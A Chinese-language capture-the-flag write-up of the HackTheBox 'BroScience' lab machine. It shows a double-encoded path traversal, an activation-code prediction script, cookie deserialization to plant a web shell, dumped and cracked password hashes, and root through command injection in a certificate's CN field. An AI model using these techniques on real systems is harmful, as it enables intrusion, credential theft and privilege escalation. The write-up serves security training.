# 信息搜集

22、80、443 端口

    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 10:51 CST
    Nmap scan report for 10.10.11.195
    Host is up (0.51s latency).
    Not shown: 65532 closed tcp ports (reset)
    PORT    STATE SERVICE
    22/tcp  open  ssh
    80/tcp  open  http
    443/tcp open  https

    Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds

TCP 扫描 22、80、443 端口，感觉靶机的 linux 有点低…………

    > sudo nmap -sV -sT -O -p22,80,443 10.10.11.195
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 10:58 CST
    Nmap scan report for broscience.htb (10.10.11.195)
    Host is up (0.50s latency).

    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
    80/tcp  open  http     Apache httpd 2.4.54
    443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 36.63 seconds

UDP 扫描 22、80、443 端口

    > sudo nmap -sU -p22,80,443 10.10.11.195
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 11:04 CST
    Nmap scan report for broscience.htb (10.10.11.195)
    Host is up (0.60s latency).

    PORT    STATE  SERVICE
    22/udp  closed ssh
    80/udp  closed http
    443/udp closed https

    Nmap done: 1 IP address (1 host up) scanned in 1.55 seconds

nmap 漏洞扫描脚本

    ~/Hackthebox-BroScience
    > sudo nmap --script=vuln -p22,80,443 10.10.11.195
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 11:04 CST
    Nmap scan report for broscience.htb (10.10.11.195)
    Host is up (0.36s latency).

    PORT    STATE SERVICE
    22/tcp  open  ssh
    80/tcp  open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-passwd: ERROR: Script execution failed (use -d to debug)
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    443/tcp open  https
    | http-enum:
    |   /login.php: Possible admin folder
    |   /user.php: Possible admin folder
    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.54 (debian)'
    |   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.54 (debian)'
    |   /manual/: Potentially interesting folder
    |_  /styles/: Potentially interesting directory w/ listing on 'apache/2.4.54 (debian)'
    | http-cookie-flags:
    |   /:
    |     PHPSESSID:
    |       secure flag not set and HTTPS in use
    |_      httponly flag not set
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-csrf:
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=broscience.htb
    |   Found the following possible CSRF vulnerabilities:
    |
    |     Path: https://broscience.htb:443/exercise.php?id=5
    |     Form id:
    |     Form action: /comment.php
    |
    |     Path: https://broscience.htb:443/login.php
    |     Form id:
    |     Form action: login.php
    |
    |     Path: https://broscience.htb:443/exercise.php?id=2
    |     Form id:
    |     Form action: /comment.php
    |
    |     Path: https://broscience.htb:443/exercise.php?id=1
    |     Form id:
    |     Form action: /comment.php
    |
    |     Path: https://broscience.htb:443/exercise.php?id=3
    |     Form id:
    |     Form action: /comment.php
    |
    |     Path: https://broscience.htb:443/exercise.php?id=4
    |     Form id:
    |     Form action: /comment.php
    |
    |     Path: https://broscience.htb:443/exercise.php?id=8
    |     Form id:
    |_    Form action: /comment.php
    |_http-dombased-xss: Couldn't find any DOM based XSS.

    Nmap done: 1 IP address (1 host up) scanned in 162.82 seconds

# web 渗透

打开火狐看一下前端源码，看到几处有意思的攻击点

**有登录点，可能存在有传参任意文件读，还有传参 sql 注入**

![](https://i.328888.xyz/2023/04/05/i8ikMx.png)

经过手工测试，貌似没有什么问题…………

还有注册页面，尝试注册账号，然后登录进去看看，啊，注册账号后需要验证邮箱，验证功能貌似没用…………

## img.php 双重 url 编码 任意文件读

就很无语，明明已经过滤了，没有必要在过滤之后又进行一次 url 解码

```shell
~/Hackthebox-BroScience/src
> curl -k 'https://broscience.htb/includes/img.php?path=..%252fincludes/img.php'
	<?php
	if (!isset($_GET['path'])) {
	    die('<b>Error:</b> Missing \'path\' parameter.');
	}

	// Check for LFI attacks
	$path = $_GET['path'];

	$badwords = array("../", "etc/passwd", ".ssh");
	foreach ($badwords as $badword) {
	    if (strpos($path, $badword) !== false) {
	        die('<b>Error:</b> Attack detected.');
	    }
	}

	// Normalize path
	$path = urldecode($path);

	// Return the image
	header('Content-Type: image/png');
	echo file_get_contents('/var/www/html/images/' . $path);
	?>%
```

可能为了测试出这个地方使用双重 URL 编码绕过，需要使用一定的 FUZZ 手段

下载一个 github payloads 仓库

```shell
git clone https://github.com/foospidy/payloads.git
wfuzz -c -w /tools/payloads/other/traversal/dotdotpwn.txt --hh=30,0 -u 'https://broscience.htb/includes/img.php?path=FUZZ'
```

统统 fuzz 一遍，就发现双重编码是可以绕过的

![](https://i.328888.xyz/2023/04/05/i8VQKA.png)

# 代码审计

将整个题目源码下载下来审计

![](https://i.328888.xyz/2023/04/05/i8f0Sp.png)

任意文件写

```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```

反序列化点

```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}
```

接下来找页面中哪个 php 调用了 `get_theme_class` 函数，发现页面很多处地方调用此函数

问题是，现在需要登录才能进入到我们需要的账号里面去，查看 register.php

生成一个 activation_code，需要这个才能成功进行验证

![](https://i.328888.xyz/2023/04/05/i8fuM8.png)

查看 activation_code 生成的逻辑。嗯，**`srand()` 是伪随机数，以 `time()` 时间戳作为种子，需要适当的写 poc 请求一下**

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

写好的 poc 如下: **注意：php srand 伪随机数，使用 window 和 linux 操作系统的结果不相同，做题的时候坑了我好久，最后还是在 linux 上生成了一段校验码，才得以成功**

```python
import requests
import urllib3
import string
import time
import random
urllib3.disable_warnings()

getcode_url = "http://172.27.0.1/1.php" # 自己搭建一个 php 服务，用于生成校验码

target_url = "https://broscience.htb/register.php"


data = {
    'username' : ''.join(random.sample(string.ascii_letters + string.digits, 8)),
    'email' : ''.join(random.sample(string.ascii_letters + string.digits, 8)) + "@1.com",
    'password' : "123456",
    'password-confirm' : "123456"
}
print(data)

r = requests.post(target_url, data=data,verify=False)
print(r.text)

start = 1680672676 - 1
for i in range(2):
    print(f"\nstart: {start}")
    r = requests.get(getcode_url+"?time="+str(start))
    print(r.text)

    activate_url = f"https://broscience.htb/activate.php?code={activation_code}"
    print(f"activate_url: {activate_url}\n")

    r = requests.get(activate_url,verify=False)
    if "Invalid activation code." not in r.text:
        print(data)
        break
    start += 1
```

![](https://i.328888.xyz/2023/04/05/i84BBJ.png)
登陆之后，拿到有效的 PHPSESSID，之后通过 cookie 触发反序列化，写入 shell

![](https://i.328888.xyz/2023/04/05/i84QK8.png)

# 提权部分

拿到 www-data shell，查看 /etc/passwd

    www-data@broscience:/var/www$ cat /etc/passwd
    cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
    sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
    dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
    speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
    pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
    saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
    colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
    geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
    Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
    bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    _laurel:x:998:998::/var/log/laurel:/bin/false

看到 bill 账号，可能有用

查看一下 suid

    www-data@broscience:/var/www$ find / -user root -perm -4000 -print 2>/dev/null
    <w$ find / -user root -perm -4000 -print 2>/dev/null
    /usr/lib/xorg/Xorg.wrap
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/sbin/pppd
    /usr/bin/vmware-user-suid-wrapper
    /usr/bin/newgrp
    /usr/bin/fusermount3
    /usr/bin/passwd
    /usr/bin/su
    /usr/bin/sudo
    /usr/bin/chfn
    /usr/bin/mount
    /usr/bin/ntfs-3g
    /usr/bin/umount
    /usr/bin/gpasswd
    /usr/bin/chsh
    /usr/libexec/polkit-agent-helper-1

## psql 获取加密密码

查看数据库，使用命令行进行连接

```shell
www-data@broscience:/tmp$ psql -h localhost -p 5432 -U dbuser -d broscience
psql -h localhost -p 5432 -U dbuser -d broscience
Password for user dbuser: RangeOfMotion%777

psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=> \dt
\dt
WARNING: terminal is not fully functional
-  (press RETURN)
           List of relations
 Schema |   Name    | Type  |  Owner
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)

broscience=> select username,password from users;
select username,password from users;
WARNING: terminal is not fully functional
-  (press RETURN)
   username    |             password
---------------+----------------------------------
 administrator | 15657792073e8a843d4f91fc403454e1
 bill          | 13edad4932da9dbb57d9cd15b66ed104
 michael       | bd3dad50e2d578ecba87d5fa15ca5f85
 john          | a7eed23a7be6fe0d765197b1027453fe
 dmytro        | 5d15340bded5b9395d5d14b9c21bc82b
(5 rows)

```

有点搞心态，psql 如何 dump 数据库呀，恼。我都是一句一句 select 出来的

![](https://i.328888.xyz/2023/04/05/i8UieC.png)

## hashcat crack + login in bill

获取的密码都是加盐 md5: `md5("NaCl" . $_POST['password'])`

**加盐正常字典是爆破不出来的，但是我们可以修改字典，给我们的字典也一起加盐呀.jpg**

通过 john 来爆破密码，需要在我们的爆破字典前面全部加上 **NaCl**

```shell
> cp /usr/share/wordlists/rockyou.txt rockyou.txt
> sed -i 's|^|NaCl|g' rockyou.txt
> cat hash.txt
administrator:15657792073e8a843d4f91fc403454e1
bill:13edad4932da9dbb57d9cd15b66ed104
michael:bd3dad50e2d578ecba87d5fa15ca5f85
john:a7eed23a7be6fe0d765197b1027453fe
dmytro:5d15340bded5b9395d5d14b9c21bc82b
> john hash.txt -w=rockyou.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
NaCliluvhorsesandgym (bill)
NaClAaronthehottest (dmytro)
NaCl2applesplus2apples (michael)
3g 0:00:00:00 DONE (2023-04-05 14:36) 5.263g/s 25163Kp/s 25163Kc/s 105540KC/s NaCl 08 22 0128..NaCl*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

尝试使用爆破出的密码 **iluvhorsesandgym** 登录 bill，获得 user.txt

![](https://i.328888.xyz/2023/04/05/i8U5XX.md.png)

## 权限升级

### pspy64

从 github 下载二进制可执行文件，执行之后查看 linux 机器上运行的进程信息

**关键在于: 查看 root 权限运行的进程，判断是否可以通过修改**

![](https://i.328888.xyz/2023/04/05/i8tDGo.png)

好，`/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt`

**但是 Bill 账号没有权限修改这个脚本，不过可以修改证书呀**

```shell
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
fi
```

需要伪造证书中的 `'CN = .*,?'` 字段

`commonName=$(echo ${commonName:5} | awk -F, '{print $1}')` 将 `CN = ` 这五个字符截取了，只取后面的字符串（**一开始还以为只能使用前五个字符，来 root，原来指的是五个之后的字符串**）

![](https://i.328888.xyz/2023/04/05/i8Wykv.png)

给 /bin/bash 加上 suid，成功 root

# PWN！

![](https://i.328888.xyz/2023/04/05/i8Wnr8.png)

# 使用工具

- psql
- hashcat + rockyou.txt
- pspy64
- ssh-keygen -t rsa -m PEM
